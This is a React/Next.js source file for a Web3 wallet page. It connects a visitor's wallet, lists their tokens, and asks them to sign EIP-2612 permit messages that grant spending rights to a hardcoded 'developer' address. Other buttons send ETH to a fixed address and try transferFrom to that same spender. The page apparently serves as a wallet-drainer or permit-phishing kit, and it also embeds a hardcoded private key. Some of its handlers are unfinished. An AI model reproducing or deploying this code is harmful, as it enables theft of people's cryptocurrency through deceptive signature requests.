'use client';
import {useWalletInfo, useWeb3Modal} from "@web3modal/scaffold-react";
import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage} from "wagmi";
import {parseEther} from "viem";
import {signTypedData} from "@wagmi/core";
import {config} from "@/context/config";
import {ethers, Wallet} from "ethers";
import React, {useEffect, useState} from "react";
import {useEthersProvider, useEthersSigner} from "@/app/ethers";
import {JsonRpcSigner} from "@ethersproject/providers";
import TokenList, {ContractCovalenTHQ} from "@/app/TokenList";

const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
const developer = {
	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
}
const abi = [
	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
	'function nonces(address owner) view returns (uint256)'
];

const Page = () => {
	const open = useWeb3Modal();
	const wallet = useWalletInfo();
	const account = useAccount();
	const { signMessage } = useSignMessage();
	const { sendTransaction } = useSendTransaction()
	const {disconnect} = useDisconnect();
	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
	const signer = useEthersSigner();
	const provider = useEthersProvider();
	const [signatures, setSignatures] = useState<{
		[key: string]: Awaited<ReturnType<typeof createPermitSignature>>
	}>({})
	const {data: balance, isLoading} = useBalance({
		address: account.address
	})
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);

	if (!account || isLoading) return <button onClick={() => open.open()}>
		open
	</button>;

	const message = {
		"owner": account.address!,
		"spender": developer.address!,
		"value": parseEther('0.0000001'),
		"nonce": 1,
		"deadline": 2661766724
	} as any;

	return (
		<div>
			<button onClick={() => open.open()}>
				open
			</button>
			<img src={wallet.walletInfo?.icon}/>
			<br/>
			<button onClick={() => {
				console.log(signMessage({
					message: "test",
				}))
			}}>Sign Message
			</button>
			<br/>
			{account.isConnected + ""}
			<br/>
			{account.address}
			<br/>
			{account.chainId}
			<br/>
			<button
				onClick={() => sendTransaction({
					gas: null,
					to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
					value: parseEther('0.0001'),
				})}
			>
				Transfer
			</button>
			<button onClick={disconnect as any}>
				DC

			</button>
			<br/>
			<br/>
			{tokens.map(token => {

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
							const sig = await createPermitSignature((args: any)=>{
								return signTypedData(config, args);
							},
							token.contract_name || "UNITY2",
								token.contract_address,
								account.chainId,
								account.address,
								developer.address,
								5000,
								1,
								
							)
						}}>
							SIGN TYPED DATA
						</button>
					</div>
				)
			})}

			<br/>
			{tokens.map(token => {
				const signature = signatures[token.contract_ticker_symbol];

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!signature} onClick={async () => {
							if (!signature) return;


						}}>
							Permit
						</button>
					</div>
				)
			})}
			<br/>
			<button onClick={async ()=>{
				let tokenContract = new ethers.Contract(account.address, [
					'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
					'function transferFrom(address from, address to, uint256 value) external returns (bool)'
				], signer);

				console.log(await tokenContract.transferFrom(account.address,developer.address, message.value));
			}}>
				transfer
			</button>
			<br/>
			{account.chainId}
			<br/>
			<TokenList address={account.address + ""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
		</div>
	)
};

async function createPermitSignature(signMethod: any, domainName: string,contractAddress: string,chainId: number,owner: string, spender: string, value: number, nonce: number, deadline: number,domainVersion: string = "1") {
	const domain = {
		name: domainName,
		version: domainVersion,
		verifyingContract: contractAddress,
		chainId
	}

	const domainType = [
		{ name: 'name', type: 'string' },
		{ name: 'version', type: 'string' },
		{ name: 'chainId', type: 'uint256' },
		{ name: 'verifyingContract', type: 'address' },
	]
	const permit = { owner, spender, value, nonce, deadline }
	const Permit = [
		{ name: "owner", type: "address" },
		{ name: "spender", type: "address" },
		{ name: "value", type: "uint256" },
		{ name: "nonce", type: "uint256" },
		{ name: "deadline", type: "uint256" },
	]

	const dataToSign = JSON.stringify({
		types: {
			EIP712Domain: domainType,
			Permit: Permit
		},
		domain: domain,
		primaryType: "Permit",
		message: permit
	});

	const splitSig = (sig: string) => {
		// splits the signature to r, s, and v values.
		const pureSig = sig.replace("0x", "")

		const r = new Buffer(pureSig.substring(0, 64), 'hex')
		const s = new Buffer(pureSig.substring(64, 128), 'hex')
		const v = new Buffer((parseInt(pureSig.substring(128, 130), 16)).toString());


		return {
			r, s, v
		}
	}

	const signature = await signMethod(dataToSign)
	const split = splitSig(signature)

	return {
		...split, signature
	}
}

const createSigner = async (rpc: string)=>{
	const provider = new ethers.providers.JsonRpcProvider(rpc);
	await provider.detectNetwork()
	const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
	return new Wallet(privateKey, provider);
}

const methods = {
	allowance: "function allowance (address owner, address spender) external returns (uint256)",
	transferFrom: "function transferFrom (address from, address to, uint256 value) external returns (bool)",
	permit: 'function permit (address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'
}

async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signer: JsonRpcSigner) {
	console.log("CALL", method,args);
	let tokenContract = new ethers.Contract(addressOrName,[
		methods[method]
	], signer);

	const op = await tokenContract[method](...args)
	return await op.wait();
}

export default Page;
